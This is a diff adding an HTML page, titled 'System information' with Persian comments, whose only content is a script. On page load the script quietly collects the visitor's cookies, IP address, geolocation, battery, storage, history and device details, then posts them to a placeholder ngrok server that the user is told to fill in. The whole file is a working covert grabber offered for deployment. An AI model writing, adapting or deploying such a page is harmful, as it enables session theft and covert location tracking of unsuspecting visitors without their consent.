@@ -1,1 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اطلاعات سیستم</title>
+</head>
+<body>
+    <script>
+        const serverUrl = 'https://your-ngrok-url.com/data'; // آدرس سرور Ngrok یا سرور خود را وارد کنید
 
+        const allData = {};
+
+        // 1. نمایش کوکی‌ها
+        allData.cookies = document.cookie || 'هیچ کوکی‌ای پیدا نشد';
+
+        // 2. اطلاعات مرورگر
+        allData.browserInfo = {
+            "User Agent": navigator.userAgent,
+            "Platform": navigator.platform,
+            "Language": navigator.language,
+            "Cookies Enabled": navigator.cookieEnabled,
+        };
+
+        // 3. آدرس IP
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                allData.ipAddress = data.ip;
+            });
+
+        // 4. لوکیشن
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                allData.geoLocation = {
+                    "Latitude": position.coords.latitude,
+                    "Longitude": position.coords.longitude,
+                    "Accuracy": position.coords.accuracy
+                };
+            }, function() {
+                allData.geoLocation = 'دسترسی به لوکیشن امکان‌پذیر نیست';
+            });
+        } else {
+            allData.geoLocation = 'Geolocation در مرورگر شما پشتیبانی نمی‌شود';
+        }
+
+        // 5. اطلاعات کاربر (User-Agent)
+        allData.userAgent = navigator.userAgent;
+
+        // 6. اطلاعات صفحه وب
+        allData.pageInfo = {
+            "URL": window.location.href,
+            "Referrer": document.referrer,
+            "Title": document.title,
+            "Domain": window.location.hostname,
+            "Protocol": window.location.protocol
+        };
+
+        // 7. اطلاعات شبکه
+        allData.networkInfo = {
+            "Online": navigator.onLine,
+            "Connection Type": navigator.connection ? navigator.connection.effectiveType : 'N/A',
+        };
+
+        // 8. اطلاعات نمایشگر
+        allData.screenInfo = {
+            "Width": screen.width,
+            "Height": screen.height,
+            "Available Width": screen.availWidth,
+            "Available Height": screen.availHeight,
+            "Color Depth": screen.colorDepth,
+            "Pixel Depth": screen.pixelDepth
+        };
+
+        // 9. اطلاعات تایم
+        allData.timeInfo = {
+            "Current Time (milliseconds)": Date.now(),
+            "Current Date": new Date().toString()
+        };
+
+        // 10. اطلاعات ورودی (فعال‌ترین عنصر)
+        allData.inputInfo = document.activeElement ? document.activeElement.tagName : 'هیچ ورودی فعال نیست';
+
+        // 11. اطلاعات دستگاه
+        allData.deviceInfo = {
+            "Device Memory": navigator.deviceMemory || 'N/A',
+            "Battery Status": 'در حال دریافت اطلاعات باتری...'
+        };
+        navigator.getBattery().then(function(battery) {
+            allData.deviceInfo["Battery Level"] = battery.level * 100 + '%';
+            allData.deviceInfo["Charging"] = battery.charging ? 'بله' : 'خیر';
+        });
+
+        // 12. اطلاعات مرورگر (Performance)
+        allData.performanceInfo = {
+            "Performance Now (milliseconds)": performance.now(),
+            "Memory Usage": performance.memory ? performance.memory.totalJSHeapSize : 'N/A'
+        };
+
+        // 13. اطلاعات ذخیره‌سازی
+        allData.storageInfo = {
+            "LocalStorage": localStorage.length ? 'داده‌هایی ذخیره شده است' : 'هیچ داده‌ای در localStorage نیست',
+            "SessionStorage": sessionStorage.length ? 'داده‌هایی ذخیره شده است' : 'هیچ داده‌ای در sessionStorage نیست'
+        };
+
+        // 14. اطلاعات فرم‌ها
+        allData.formInfo = Array.from(document.forms).map(form => form.name || 'فرم بدون نام');
+
+        // 15. اطلاعات تاریخچه مرورگر
+        allData.historyInfo = {
+            "History Length": window.history.length,
+            "Current History State": window.history.state || 'هیچ وضعیت فعالی وجود ندارد'
+        };
+
+        // ارسال داده‌ها به سرور
+        function sendData() {
+            fetch(serverUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(allData)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('200');
+                } else {
+                    console.log('خطا در ارسال درخواست');
+                }
+            })
+            .catch(error => {
+                console.error('خطا در ارسال داده‌ها:', error);
+            });
+        }
+
+        // پس از دریافت تمام داده‌ها، داده‌ها را ارسال می‌کنیم
+        setTimeout(sendData, 2000); // 2 ثانیه منتظر می‌مانیم تا همه داده‌ها جمع‌آوری شوند
+    </script>
+</body>
+</html>
